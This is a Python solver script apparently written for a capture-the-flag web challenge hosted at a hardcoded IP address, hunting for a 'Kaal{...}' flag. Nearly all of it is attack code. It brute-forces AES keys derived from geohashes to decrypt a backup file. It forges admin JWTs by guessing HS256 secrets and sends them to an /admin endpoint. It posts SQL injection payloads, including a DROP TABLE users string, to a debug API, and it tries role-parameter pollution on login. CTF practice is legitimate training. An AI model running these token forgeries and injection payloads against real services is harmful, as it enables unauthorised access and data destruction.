#!/usr/bin/env python3
"""
Strategic approach - analyze patterns and think like the challenge author
"""

import requests
import jwt
import hashlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import pygeohash as pgh
import re

TARGET_URL = "http://138.199.163.92:12973/"

def analyze_backup_deeply():
    """Deep analysis of backup.bin"""
    print("="*60)
    print("DEEP ANALYSIS OF BACKUP.BIN")
    print("="*60)
    
    with open('backup.bin', 'rb') as f:
        data = f.read()
    
    print(f"Length: {len(data)} bytes")
    print(f"Hex: {data.hex()}")
    print()
    
    # 48 bytes = 3 AES blocks (16 bytes each)
    # This suggests the plaintext is probably 32-48 bytes
    # A flag like "Kaal{...}" would be around 30-40 bytes
    
    # Let's think about what the key could be:
    # The challenge mentions "geohashing puzzle"
    # Maybe we need to COMPUTE something from geohashes
    
    # Null Island is 0,0
    # The page says "u000" but that's wrong (it's actually s000)
    # Maybe the KEY is the DIFFERENCE or COMBINATION?
    
    print("Hypothesis: The key might be derived from geohash operations")
    print()
    
    # Get geohashes for Null Island at different precisions
    lat, lon = 0.0, 0.0
    geohashes = []
    for p in range(1, 13):
        gh = pgh.encode(lat, lon, precision=p)
        geohashes.append(gh)
        print(f"Precision {p}: {gh}")
    
    print()
    
    # Try combinations and operations
    test_keys = []
    
    # Concatenations
    test_keys.append(geohashes[3] + geohashes[3])  # s000s000
    test_keys.append(geohashes[3] + geohashes[4])  # s000s0000
    
    # XOR of characters?
    # Hash of geohash?
    for gh in geohashes[:8]:
        test_keys.append(gh)
        test_keys.append(hashlib.md5(gh.encode()).hexdigest())
        test_keys.append(hashlib.sha256(gh.encode()).hexdigest())
    
    # Maybe the key is the geohash of a DIFFERENT coordinate?
    # The page mentions "u000" - what if we need to use THAT coordinate?
    u000_lat, u000_lon = pgh.decode("u000")
    print(f"u000 coordinates: {u000_lat}, {u000_lon}")
    
    # Try u000 coordinates
    for p in range(1, 8):
        gh = pgh.encode(u000_lat, u000_lon, precision=p)
        test_keys.append(gh)
    
    # Try the MIDPOINT between s000 and u000?
    s000_lat, s000_lon = pgh.decode("s000")
    mid_lat = (s000_lat + u000_lat) / 2
    mid_lon = (s000_lon + u000_lon) / 2
    print(f"Midpoint: {mid_lat}, {mid_lon}")
    
    for p in range(1, 8):
        gh = pgh.encode(mid_lat, mid_lon, precision=p)
        test_keys.append(gh)
        print(f"Midpoint geohash precision {p}: {gh}")
    
    print(f"\nTrying {len(test_keys)} derived keys...")
    
    for key_str in test_keys:
        # Try SHA256 hash as key
        key = hashlib.sha256(key_str.encode()).digest()
        iv = b'\x00' * 16
        
        try:
            cipher = AES.new(key, AES.MODE_CBC, iv)
            decrypted = cipher.decrypt(data)
            unpadded = unpad(decrypted, 16)
            text = unpadded.decode('utf-8', errors='ignore')
            
            if 'kaal{' in text.lower():
                print(f"\n[!!!] FOUND KEY: {key_str}")
                print(f"[!!!] DECRYPTED: {text}")
                return text
            
            # Check if printable
            if all(32 <= b < 127 for b in unpadded):
                print(f"Printable with key '{key_str}': {text}")
        except:
            pass
    
    return None

def try_jwt_with_computed_secrets():
    """Try JWT with computed secrets"""
    print("\n" + "="*60)
    print("JWT WITH COMPUTED SECRETS")
    print("="*60)
    
    session = requests.Session()
    
    # Compute secrets based on geohash operations
    lat, lon = 0.0, 0.0
    
    secrets = []
    
    # Hash of coordinates
    secrets.append(hashlib.md5(f"{lat},{lon}".encode()).hexdigest())
    secrets.append(hashlib.sha256(f"{lat},{lon}".encode()).hexdigest())
    
    # Geohash hashes
    for p in range(1, 8):
        gh = pgh.encode(lat, lon, precision=p)
        secrets.append(hashlib.md5(gh.encode()).hexdigest())
        secrets.append(hashlib.sha256(gh.encode()).hexdigest()[:32])
    
    # u000 hashes
    u000_lat, u000_lon = pgh.decode("u000")
    secrets.append(hashlib.md5(f"{u000_lat},{u000_lon}".encode()).hexdigest())
    
    # Combination
    secrets.append(hashlib.md5(b"s000" + b"u000").hexdigest())
    secrets.append(hashlib.sha256(b"nullisland").hexdigest()[:32])
    
    print(f"Trying {len(secrets)} computed secrets...")
    
    payload = {"role": "admin"}
    
    for secret in secrets[:20]:  # Limit to avoid timeout
        try:
            token = jwt.encode(payload, secret, algorithm="HS256")
            headers = {"Authorization": f"Bearer {token}"}
            
            resp = session.get(TARGET_URL + 'admin', headers=headers, timeout=2)
            
            if resp.status_code == 200:
                print(f"\n[!!!] FOUND SECRET: {secret}")
                print(resp.text)
                
                flag = re.search(r'Kaal\{[^}]+\}', resp.text, re.IGNORECASE)
                if flag:
                    return flag.group(0)
        except:
            pass
    
    return None

def check_for_sql_injection_in_geohash():
    """Maybe the geohash-debug endpoint has SQLi?"""
    print("\n" + "="*60)
    print("TESTING GEOHASH-DEBUG FOR VULNERABILITIES")
    print("="*60)
    
    session = requests.Session()
    
    # Try without auth first
    payloads = [
        {"geohash": "s000"},
        {"geohash": "s000' OR '1'='1"},
        {"geohash": "s000'; DROP TABLE users--"},
        {"lat": 0, "lon": 0},
        {"lat": "0' OR '1'='1", "lon": 0},
    ]
    
    for payload in payloads:
        try:
            resp = session.post(
                TARGET_URL + 'api/v3/geohash-debug-2025',
                json=payload,
                timeout=3
            )
            
            if resp.status_code != 401 and resp.status_code != 405:
                print(f"Payload {payload}: {resp.status_code}")
                print(resp.text[:200])
                
                if 'kaal{' in resp.text.lower():
                    flag = re.search(r'Kaal\{[^}]+\}', resp.text, re.IGNORECASE)
                    if flag:
                        return flag.group(0)
        except:
            pass
    
    return None

def try_parameter_pollution():
    """Try parameter pollution on login"""
    print("\n" + "="*60)
    print("PARAMETER POLLUTION")
    print("="*60)
    
    session = requests.Session()
    
    # Try sending multiple role parameters
    payloads = [
        {"username": "admin", "password": "admin", "role": "admin"},
        {"username": "guest", "password": "guest", "role": "admin"},
        {"username": "admin", "password": "wrong", "admin": True},
    ]
    
    for payload in payloads:
        try:
            resp = session.post(TARGET_URL + 'login', json=payload, timeout=3)
            
            if resp.status_code == 200:
                print(f"Success with: {payload}")
                print(resp.text)
                
                try:
                    data = resp.json()
                    if 'token' in data:
                        token = data['token']
                        headers = {"Authorization": f"Bearer {token}"}
                        
                        resp2 = session.get(TARGET_URL + 'admin', headers=headers)
                        if 'kaal{' in resp2.text.lower():
                            flag = re.search(r'Kaal\{[^}]+\}', resp2.text, re.IGNORECASE)
                            if flag:
                                return flag.group(0)
                except:
                    pass
        except:
            pass
    
    return None

def main():
    print("STRATEGIC SOLVE - THINKING LIKE THE AUTHOR")
    print()
    
    # The challenge is about "geohashing puzzle"
    # Maybe we need to COMPUTE something from geohashes
    
    result = analyze_backup_deeply()
    if result:
        print(f"\n{'='*60}")
        print(f"FLAG: {result}")
        print(f"{'='*60}")
        return
    
    result = try_jwt_with_computed_secrets()
    if result:
        print(f"\n{'='*60}")
        print(f"FLAG: {result}")
        print(f"{'='*60}")
        return
    
    result = check_for_sql_injection_in_geohash()
    if result:
        print(f"\n{'='*60}")
        print(f"FLAG: {result}")
        print(f"{'='*60}")
        return
    
    result = try_parameter_pollution()
    if result:
        print(f"\n{'='*60}")
        print(f"FLAG: {result}")
        print(f"{'='*60}")
        return
    
    print("\n" + "="*60)
    print("Strategic attempts complete")
    print("="*60)

if __name__ == "__main__":
    main()
